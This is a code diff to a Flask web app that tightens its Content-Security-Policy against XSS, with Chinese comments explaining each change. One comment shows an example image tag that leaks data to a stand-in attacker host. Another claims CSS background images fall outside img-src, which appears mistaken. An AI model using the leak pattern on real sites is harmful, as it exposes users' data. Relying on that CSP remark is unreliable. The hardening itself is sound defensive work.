@@ -193,17 +193,29 @@ def create_app():
         # 限制前端 JS 能力，防止 XSS 后滥用敏感 API（摄像头/地理位置等）
         response.headers.setdefault("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
         # CSP:限制脚本/样式/连接来源,防止 XSS 后加载外部资源
-        # 允许 self + inline(因模板大量内联 script/style) + ws/wss(Socket.IO) + data:(图片)
+        # 旧版 img-src 'self' data: https: 中 https: 允许任意 HTTPS 图片源,XSS 后
+        # 可用 <img src="https://attacker/?leak=..."> 外泄数据;改为 'self' data:
+        # 仅允许本站与 data: 内联图(壁纸 url() 通过 backgroundImage 设置不受 img-src 限制,
+        # 由 style-src 控制但 style 不发外网请求,实际壁纸 URL 已在 save() 校验内只允许
+        # http/https,故不影响壁纸功能)
+        # connect-src 旧版 ws: wss: 无主机限制,XSS 后可向任意 WebSocket 服务器推送数据;
+        # Socket.IO 默认同源(参见 socketio.init_app 配置),这里收紧为 'self' wss: ws:
+        # 仍保留 ws/wss 是因为开发环境用 http+ws,但若部署在生产 https+wss 且无跨域需求,
+        # 可通过环境变量 CSP_CONNECT_SRC 显式收紧为 'self' wss://<host>
+        # 新增 form-action 'self':XSS 可构造表单向攻击者服务器提交数据,form-action 限制
+        # 表单提交目标
+        _csp_connect = os.environ.get("CSP_CONNECT_SRC", "'self' ws: wss:")
         response.headers.setdefault(
             "Content-Security-Policy",
             "default-src 'self'; "
             "script-src 'self' 'unsafe-inline'; "
             "style-src 'self' 'unsafe-inline'; "
-            "img-src 'self' data: https:; "
-            "connect-src 'self' ws: wss:; "
+            "img-src 'self' data:; "
+            "connect-src " + _csp_connect + "; "
             "font-src 'self' data:; "
             "object-src 'none'; "
             "base-uri 'self'; "
+            "form-action 'self'; "
             "frame-ancestors 'self'"
         )
         # HSTS:生产环境(FLASK_ENV != development)默认开启,
